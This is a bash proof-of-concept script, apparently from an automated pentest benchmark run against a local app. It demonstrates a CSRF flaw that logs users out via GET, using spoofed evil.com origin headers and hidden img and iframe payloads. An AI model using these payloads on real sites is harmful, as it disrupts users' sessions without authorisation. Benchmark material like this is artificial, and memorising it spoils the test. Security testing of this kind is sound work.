#!/bin/bash
# POC: Demonstrates CSRF vulnerability on logout endpoint via GET request - simulates attacker forcing logout of authenticated user
# Target: ./repo
# Created: 2025-12-01T16:01:06.801Z
# Session: benchmark-XBEN-093-24-minbvw4l

# CSRF Attack on Logout Endpoint - GET Request Vulnerability POC
# This script demonstrates how an attacker can force a user to logout
# by exploiting the GET method acceptance on the /logout endpoint

TARGET_URL="http://localhost:5003"
LOGOUT_ENDPOINT="/logout"

echo "=== CSRF Attack POC: Logout via GET Request ==="
echo

# Step 1: Get a valid session by logging in with default credentials
echo "[*] Step 1: Logging in with default credentials to obtain valid session..."
LOGIN_RESPONSE=$(curl -s -c /tmp/cookies.txt -X POST "${TARGET_URL}/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=user&password=user" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$LOGIN_RESPONSE" | tail -n1)
echo "[+] Login response code: $HTTP_CODE"

if [ "$HTTP_CODE" != "302" ]; then
  echo "[-] Login failed. Cannot proceed with CSRF test."
  exit 1
fi

# Step 2: Verify we have an active session
echo
echo "[*] Step 2: Verifying active session by accessing /transactions..."
SESSION_TEST=$(curl -s -b /tmp/cookies.txt "${TARGET_URL}/transactions" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$SESSION_TEST" | tail -n1)
echo "[+] Session verification response code: $HTTP_CODE"

if [ "$HTTP_CODE" != "200" ]; then
  echo "[-] Session not valid. Something went wrong."
  exit 1
fi

# Step 3: Demonstrate GET-based logout (CSRF vulnerability)
echo
echo "[*] Step 3: Testing CSRF vulnerability - Logout via GET request..."
echo "[*] Simulating attacker-origin request (Origin header: http://evil.com)..."

CSRF_TEST=$(curl -s -b /tmp/cookies.txt \
  -H "Origin: http://evil.com" \
  -H "Referer: http://evil.com/attack.html" \
  "${TARGET_URL}${LOGOUT_ENDPOINT}" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$CSRF_TEST" | tail -n1)
RESPONSE_BODY=$(echo "$CSRF_TEST" | head -n -1)

echo "[+] Logout response code: $HTTP_CODE"
echo "[+] Response indicates redirect/logout: $(echo "$RESPONSE_BODY" | grep -q "Redirecting" && echo "YES" || echo "Check response")"

if [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "200" ]; then
  echo "[+] VULNERABILITY CONFIRMED: GET request on /logout succeeded even with attacker origin!"
fi

# Step 4: Verify logout was successful
echo
echo "[*] Step 4: Verifying logout was successful by attempting to access protected resource..."
POST_LOGOUT=$(curl -s -b /tmp/cookies.txt "${TARGET_URL}/transactions" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$POST_LOGOUT" | tail -n1)
echo "[+] Post-logout access attempt response code: $HTTP_CODE"

if [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "401" ]; then
  echo "[+] CSRF Attack Successful: User was logged out via GET request!"
  echo "[+] Attacker can force logout without POST or CSRF token validation"
else
  echo "[!] Session may still be valid"
fi

# Step 5: Demonstrate the HTML attack payload
echo
echo "[*] Step 5: Demonstrating HTML attack payload that would be embedded in attacker's website..."
echo "[+] Attacker would place this in malicious HTML:"
echo ""
echo '    <img src="http://localhost:5003/logout" style="display:none;" />'
echo ""
echo "[+] Or use iframe redirect:"
echo ""
echo '    <iframe src="http://localhost:5003/logout" style="display:none;"></iframe>'
echo ""
echo "[+] When a logged-in user visits the attacker's page, they get logged out automatically!"

echo
echo "=== POC Complete ==="
echo "[!] CRITICAL FINDING: Logout endpoint accepts GET requests without CSRF protection"
echo "[!] Any website can force a user to logout by embedding a simple image/iframe tag"

# Cleanup
rm -f /tmp/cookies.txt